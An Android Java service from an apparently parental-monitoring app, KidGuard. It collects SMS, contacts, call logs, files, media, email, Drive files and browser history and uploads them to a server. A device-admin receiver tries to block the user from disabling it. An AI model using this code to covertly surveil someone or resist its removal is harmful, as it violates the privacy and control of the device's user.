 package com.kidguard.services;


import android.Manifest;
import android.app.Service;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import com.google.api.services.drive.Drive;
import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.reflect.TypeToken;
import com.kidguard.MainActivity;
import com.kidguard.R;
import com.kidguard.asynctask.CallsAsyncTask;
import com.kidguard.asynctask.ContactsAsyncTask;
import com.kidguard.asynctask.DownloadDriveFiles;
import com.kidguard.asynctask.FilesAsyncTask;
import com.kidguard.asynctask.ImagesAsyncTask;
import com.kidguard.asynctask.SmsAsyncTask;
import com.kidguard.asynctask.VideoAsyncTask;
import com.kidguard.interfaces.Constant;
import com.kidguard.model.Apps;
import com.kidguard.model.BrowserHistory;
import com.kidguard.model.Calls;
import com.kidguard.model.Contacts;
import com.kidguard.model.Files;
import com.kidguard.model.GoogleDrive;
import com.kidguard.model.Images;
import com.kidguard.model.Mail;
import com.kidguard.model.Sms;
import com.kidguard.model.Video;
import com.kidguard.preference.Preference;
import com.kidguard.utilities.Utilities;

import java.io.File;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.List;

@SuppressWarnings("all")
public class BackgroundDataService extends Service implements Constant {

    private static final String TAG = "BackgroundDataService";
    private static BackgroundDataService services;
    private Context context;
    private ArrayList<Sms> lstSms;
    private ArrayList<Contacts> lstContacts;
    private ArrayList<Calls> lstCalls;
    private ArrayList<Files> lstFiles;
    private ArrayList<Apps> lstApps;
    private ArrayList<Images> lstImages;
    private ArrayList<Video> lstVideo;
    private ArrayList<Mail> lstEmail;
    private ArrayList<GoogleDrive> lstDrive;
    private ArrayList<GoogleDrive> lstDrive2;
    private ArrayList<BrowserHistory> lstBrowserHistory;
    private ArrayList<File> fileList;
    @SuppressWarnings("FieldCanBeLocal")
    private String finalJSON;
    @SuppressWarnings("FieldCanBeLocal")
    private StringBuffer sbAppend;

    private DevicePolicyManager mDPM;
    private ComponentName mDeviceAdminSample;
    protected boolean mAdminActive;

    @SuppressWarnings("FieldCanBeLocal")
    private String tag;
    @SuppressWarnings("FieldCanBeLocal")
    private String count;
    @SuppressWarnings("FieldCanBeLocal")
    private String dateFrom;
    @SuppressWarnings("FieldCanBeLocal")
    private String dateTo;
    @SuppressWarnings("FieldCanBeLocal")
    private String subject;
    @SuppressWarnings("FieldCanBeLocal")
    private String size;


    public static BackgroundDataService getInstance() {
        return services;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        this.context = this;

        // Retrieve the useful instance variables
        services = BackgroundDataService.this;

        // Prepare to work with the DPM
        mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        mDeviceAdminSample = new ComponentName(context, DeviceAdminSampleReceiver.class);

        mDPM = services.mDPM;
        mDeviceAdminSample = services.mDeviceAdminSample;
        mAdminActive = services.isActiveAdmin();

        Log.e("active", "active??" + mAdminActive);
        Log.e("active", "Pref??" + Preference.getIsAdminActive(context));

        /* Check For Device Admin Permission Are Enable Or Not */
        if (!Preference.getIsAdminActive(context)) {
            Preference.setIsAdminActive(context, true);
            getDeviceAdminPermission(REQUEST_CODE_ENABLE_ADMIN);
            return;
        }
    }

    //onStartCommand
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        tag = intent.getStringExtra(KEY_TAG);
        count = intent.getStringExtra(KEY_COUNT);
        dateFrom = intent.getStringExtra(KEY_DATE_FROM);
        dateTo = intent.getStringExtra(KEY_DATE_TO);
        subject = intent.getStringExtra(KEY_SUBJECT);
        size = intent.getStringExtra(KEY_SIZE);
        /* Get Data With Tag */
        if (tag != null && !tag.equals("")) {

            GetDataWithTag(tag, count, dateFrom, dateTo, subject, size);
        }

        return super.onStartCommand(intent, flags, startId);
    }

    /**
     * Helper to determine if we are an active admin
     */
    public boolean isActiveAdmin() {
        return mDPM.isAdminActive(mDeviceAdminSample);
    }

    // Get Device Admin Permissions
    private void getDeviceAdminPermission(int requestCode) {
        switch (requestCode) {
            case REQUEST_CODE_ENABLE_ADMIN:
                // Launch the activity to have the user enable our admin.
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdminSample);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        getString(R.string.add_admin_extra_app_text));
                if (MainActivity.getInstance() != null) {
                    MainActivity.getInstance().startActivity(intent);
                }
                break;
            default:
                break;
        }
    }

    /* Get Data With Tag */
    private void GetDataWithTag(String tag, String count, String dateFrom, String dateTo, String size, String subject) {
        if (tag.equals(TAG_SMS)) {
            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_SMS)) {
                new SmsAsyncTask(this).execute(count, dateFrom, dateTo);
            }
            return;
        }

        if (tag.equals(TAG_CONTACTS)) {
            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_CONTACTS)) {
                new ContactsAsyncTask(this).execute(count, dateFrom, dateTo);
            }
            return;
        }

        if (tag.equals(TAG_CALLS)) {
            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_CALL_LOG)) {
                new CallsAsyncTask(this).execute(count, dateFrom, dateTo);
            }
            return;
        }

        if (tag.equals(TAG_FILES)) {
            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                    && Utilities.PackageUtil.checkPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                new FilesAsyncTask(this).execute(count, dateFrom, dateTo);
            }
            return;
        }

        if (tag.equals(TAG_IMAGES)) {
            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                    && Utilities.PackageUtil.checkPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                new ImagesAsyncTask(this).execute(count, dateFrom, dateTo, size);
            }
            return;
        }

        if (tag.equals(TAG_LIST_APPS)) {
            Utilities.getListApps(this);
            return;
        }

        if (tag.equals(TAG_CAMERA)) {
            try {
                if (mAdminActive) {
                    mDPM.setCameraDisabled(mDeviceAdminSample, true);
                }
            } catch (SecurityException e) {
                e.printStackTrace();
            } catch (NoSuchMethodError e) {
                e.printStackTrace();
            }
            return;
        }

        if (tag.equals(TAG_EMAIL)) {
            passServiceIntent(tag, count, dateFrom, dateTo, subject, size);
            return;
        }

        if (tag.equals(TAG_GOOGLE_DRIVE)) {
            passServiceIntent(tag, count, dateFrom, dateTo, subject, size);
            return;
        }

        if (tag.equals(TAG_VIDEOS)) {
            if (Utilities.PackageUtil.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                    && Utilities.PackageUtil.checkPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                new VideoAsyncTask(this).execute(count, dateFrom, dateTo, size);
            }
            return;
        }

        if (tag.equals(TAG_BROWSER_HISTORY)) {
            Utilities.getBrowserHistoryList(this);
            return;
        }

        return;
    }

    /* Pass Service Intent */
    private void passServiceIntent(String tag, String count, String dateFrom, String dateTo, String subject, String size) {
        String _tag = null;
        if (tag.equals(TAG_EMAIL)) {
            _tag = tag;
        } else {
            _tag = tag;
        }

        startService(new Intent(this, GoogleAccountService.class)
                .putExtra(KEY_TAG, _tag)
                .putExtra(KEY_COUNT, count)
                .putExtra(KEY_DATE_FROM, dateFrom)
                .putExtra(KEY_DATE_TO, dateTo)
                .putExtra(KEY_SUBJECT, subject)
                .putExtra(KEY_SIZE, size)
        );
    }

    /* Send Sms Data To Server */
    public void sendSmsDataToServer(ArrayList<Sms> lstSms) {
        this.lstSms = lstSms;
        String sms = convertToJSONFormat(TAG_SMS);
        new RestClientService(TAG_SMS, Preference.getAccessToken(context), sms);
        stopSelf();
    }

    /* Send Contacts Data To Server */
    public void sendContactsDataToServer(ArrayList<Contacts> lstContacts) {
        this.lstContacts = lstContacts;
        String contact = convertToJSONFormat(TAG_CONTACTS);
        new RestClientService(TAG_CONTACTS, Preference.getAccessToken(context), contact);
        stopSelf();
    }

    /* Send Calls Data To Server */
    public void sendCallsDataToServer(ArrayList<Calls> lstCalls) {
        this.lstCalls = lstCalls;
        String calls = convertToJSONFormat(TAG_CALLS);
        new RestClientService(TAG_CALLS, Preference.getAccessToken(context), calls);
        stopSelf();
    }

    /* Send Files Data To Server */
    public void sendFilesDataToServer(ArrayList<Files> lstFiles) {
        this.lstFiles = lstFiles;
        String files = convertToJSONFormat(TAG_FILES);
        new RestClientService(TAG_FILES, Preference.getAccessToken(context), lstFiles);
        stopSelf();
    }

    /* Send Apps Data To Server */
    public void sendAppsDataToServer(ArrayList<Apps> lstApps) {
        this.lstApps = lstApps;
        String apps = convertToJSONFormat(TAG_LIST_APPS);
        new RestClientService(TAG_LIST_APPS, Preference.getAccessToken(context), apps);
        stopSelf();
    }

    /* Send Image Data To Server */
    public void sendImageDataToServer(ArrayList<Images> lstImages) {
        this.lstImages = lstImages;
        String images = convertToJSONFormat(TAG_IMAGES);
        new RestClientService(TAG_IMAGES, Preference.getAccessToken(context), lstImages);
        stopSelf();
    }

    /* Send EMAIL Data To Server */
    public void sendEmailDataToServer(ArrayList<Mail> lstEmail) {
        this.lstEmail = lstEmail;
        String email = convertToJSONFormat(TAG_EMAIL);
        new RestClientService(TAG_EMAIL, Preference.getAccessToken(context), email);
        stopSelf();
    }

    /* Send Videos Data To Server */
    public void sendVideosDataToServer(ArrayList<Video> lstVideo) {
        this.lstVideo = lstVideo;
        String videos = convertToJSONFormat(TAG_VIDEOS);
        new RestClientService(TAG_VIDEOS, Preference.getAccessToken(context), lstVideo);
        stopSelf();
    }

    /* Send Google Drive Data To Server */
    public void sendGoogleDriveDataToServer(ArrayList<GoogleDrive> lstDrive, Drive mDrive) {
        this.lstDrive = lstDrive;
        if (mDrive != null) {
            Preference.setDriveId(context, 1);
            for (GoogleDrive drive : lstDrive) {
                if (drive.getFileId() != null) {
                    new DownloadDriveFiles(context, mDrive, lstDrive).execute(drive.getFileId(), drive.getFileTitle());
                }
            }
        }
        convertToJSONFormat(TAG_GOOGLE_DRIVE);

    }

    /* Send Download Drive Data To Server */
    public void sendSaveDriveDataToServer() {
        fileList = new ArrayList<File>();
        lstDrive2 = new ArrayList<GoogleDrive>();
        File root = new File(Environment.getExternalStorageDirectory().toString()
                + File.separator + DRIVE_NAME);
        fileList = getFile(root);
        if (fileList.size() > 0) {
            for (File file : fileList) {
                if (lstDrive.size() > 0) {
                    for (GoogleDrive driveList : lstDrive) {
                        if (file.getName().equals(driveList.getFileTitle())) {
                            GoogleDrive drive = new GoogleDrive();
                            drive.setFileId(driveList.getFileId());
                            drive.setFileTitle(driveList.getFileTitle());
                            drive.setFileDate(driveList.getFileDate());
                            drive.setFileSize(driveList.getFileSize());
                            drive.setFileExtention(driveList.getFileExtention());
                            drive.setFileDownloadUrl(file.getAbsolutePath());
                            lstDrive2.add(drive);
                        }
                    }
                }
            }

            new RestClientService(TAG_GOOGLE_DRIVE, Preference.getAccessToken(context), lstDrive2);
        }

        stopSelf();
    }

    /* Send Browser History To Server */
    public void sendBrowserHistoryToServer(ArrayList<BrowserHistory> lstBrowserHistory) {
        this.lstBrowserHistory = lstBrowserHistory;
        String browserHistory = convertToJSONFormat(TAG_BROWSER_HISTORY);
        new RestClientService(TAG_BROWSER_HISTORY, Preference.getAccessToken(context), browserHistory);
        stopSelf();
    }

    // Get Files List
    public ArrayList<File> getFile(File dir) {
        File listFile[] = dir.listFiles();
        if (listFile != null && listFile.length > 0) {

            for (int i = 0; i < listFile.length; i++) {
                fileList.add(listFile[i]);
            }
        }
        return fileList;
    }

    /* Convert To JSON Format */
    private String convertToJSONFormat(String tag) {
        sbAppend = new StringBuffer();
        Gson gson = new Gson();

        if (tag.equals(TAG_SMS)) {
            if (lstSms != null && lstSms.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Sms>>() {
                }.getType();
                //String jsonSMS = gson.toJson(lstSms, type);
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstSms, type);
                JsonArray jsonArraySms = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Sms\":" + jsonArraySms;
                sbAppend.append(finalJSON);
            }

        }

        if (tag.equals(TAG_CONTACTS)) {
            if (lstContacts != null && lstContacts.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Contacts>>() {
                }.getType();
                // String jsonContacts = gson.toJson(lstContacts, type);
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstContacts, type);
                JsonArray jsonArrayContacts = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Contacts\":" + jsonArrayContacts;
                sbAppend.append(finalJSON);
            }
        }

        if (tag.equals(TAG_CALLS)) {
            if (lstCalls != null && lstCalls.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Calls>>() {
                }.getType();
                //String jsonCalls = gson.toJson(lstCalls, type);
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstCalls, type);
                JsonArray jsonArrayCalls = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Calls\":" + jsonArrayCalls;
                sbAppend.append(finalJSON);
            }

        }

        if (tag.equals(TAG_LIST_APPS)) {
            if (lstApps != null && lstApps.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Apps>>() {
                }.getType();
                //String jsonApps = gson.toJson(lstApps, type);
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstApps, type);
                JsonArray jsonArrayApps = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Apps\":" + jsonArrayApps;
                sbAppend.append(finalJSON);
            }

        }

        if (tag.equals(TAG_FILES)) {

            if (lstFiles != null && lstFiles.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Files>>() {
                }.getType();
                //String jsonApps = gson.toJson(lstFiles, type);
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstFiles, type);
                JsonArray jsonArrayFiles = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Files\":" + jsonArrayFiles;
                sbAppend.append(finalJSON);
            }

        }

        if (tag.equals(TAG_IMAGES)) {
            if (lstImages != null && lstImages.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Images>>() {
                }.getType();
                //String jsonApps = gson.toJson(lstImages, type);
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstImages, type);
                JsonArray jsonArrayImages = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Images\":" + jsonArrayImages;
                sbAppend.append(finalJSON);
            }

        }

        if (tag.equals(TAG_VIDEOS)) {
            if (lstVideo != null && lstVideo.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Video>>() {
                }.getType();
                //String jsonApps = gson.toJson(lstVideo, type);
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstVideo, type);
                JsonArray jsonArrayVideos = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Videos\":" + jsonArrayVideos;
                sbAppend.append(finalJSON);
            }

        }

        if (tag.equals(TAG_EMAIL)) {
            if (lstEmail != null && lstEmail.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<Mail>>() {
                }.getType();
                //String jsonApps = gson.toJson(lstEmail, type);
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstEmail, type);
                JsonArray jsonArrayEmail = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"Emails\":" + jsonArrayEmail;
                sbAppend.append(finalJSON);
            }
        }

        if (tag.equals(TAG_GOOGLE_DRIVE)) {
            if (lstDrive != null && lstDrive.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<GoogleDrive>>() {
                }.getType();
                //String jsonApps = gson.toJson(lstDrive, type);
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstDrive, type);
                JsonArray jsonArrayDrive = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"GoogleDrive\":" + jsonArrayDrive;
                sbAppend.append(finalJSON);
            }
        }

        if (tag.equals(TAG_BROWSER_HISTORY)) {
            if (lstBrowserHistory != null && lstBrowserHistory.size() > Integer.parseInt(ZERO)) {
                Type type = new TypeToken<List<GoogleDrive>>() {
                }.getType();
                //String jsonApps = gson.toJson(lstDrive, type);
                JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstBrowserHistory, type);
                JsonArray jsonArrayDrive = Utilities.getJsonArray(jsonArray);
                finalJSON = "\"BrowserHistory\":" + jsonArrayDrive;
                sbAppend.append(finalJSON);
            }
        }

        finalJSON = "{" + sbAppend + "}";
        Log.e("JSON", "FINAL??" + finalJSON);
        //Utilities.generateFile(finalJSON);
        return finalJSON;
    }

    /**
     * Sample implementation of a DeviceAdminReceiver.  Your controller must provide one,
     * although you may or may not implement all of the methods shown here.
     * <p>
     * All callbacks are on the UI thread and your implementations should not engage in any
     * blocking operations, including disk I/O.
     */
    public static class DeviceAdminSampleReceiver extends DeviceAdminReceiver {
        void showToast(Context context, String msg) {
            String status = context.getString(R.string.admin_receiver_status, msg);
            Toast.makeText(context, status, Toast.LENGTH_SHORT).show();
        }

        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction() == ACTION_DEVICE_ADMIN_DISABLE_REQUESTED) {
                abortBroadcast();
            }
            super.onReceive(context, intent);
        }

        @Override
        public void onEnabled(Context context, Intent intent) {
            Preference.setIsAdminActive(context, true);
            showToast(context, context.getString(R.string.admin_receiver_status_enabled));
        }

        @Override
        public CharSequence onDisableRequested(Context context, Intent intent) {
            return context.getString(R.string.admin_receiver_status_disable_warning);
        }

        @Override
        public void onDisabled(Context context, Intent intent) {
            Preference.setIsAdminActive(context, false);
            showToast(context, context.getString(R.string.admin_receiver_status_disabled));
        }

        @Override
        public void onPasswordChanged(Context context, Intent intent) {
            showToast(context, context.getString(R.string.admin_receiver_status_pw_changed));
        }

        @Override
        public void onPasswordFailed(Context context, Intent intent) {
            showToast(context, context.getString(R.string.admin_receiver_status_pw_failed));
        }

        @Override
        public void onPasswordSucceeded(Context context, Intent intent) {
            showToast(context, context.getString(R.string.admin_receiver_status_pw_succeeded));
        }

        @Override
        public void onPasswordExpiring(Context context, Intent intent) {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(
                    Context.DEVICE_POLICY_SERVICE);
            long expr = dpm.getPasswordExpiration(
                    new ComponentName(context, DeviceAdminSampleReceiver.class));
            long delta = expr - System.currentTimeMillis();
            boolean expired = delta < 0L;
            String message = context.getString(expired ?
                    R.string.expiration_status_past : R.string.expiration_status_future);
            showToast(context, message);
            Log.v(TAG, message);
        }

    }
}
